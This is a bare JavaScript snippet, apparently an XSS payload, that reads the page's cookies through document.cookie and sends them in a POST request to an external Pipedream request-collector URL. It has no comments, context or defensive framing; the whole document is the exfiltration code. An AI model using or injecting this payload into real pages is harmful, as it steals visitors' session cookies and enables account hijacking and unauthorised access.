const headers = new Headers()
headers.append("Content-Type", "application/json")

const body = {
  "cookies": document.cookie
}

const options = {
  method: "POST",
  headers,
  mode: "cors",
  body: JSON.stringify(body),
}

fetch("https://eoeumijw6n8e9jl.m.pipedream.net", options)
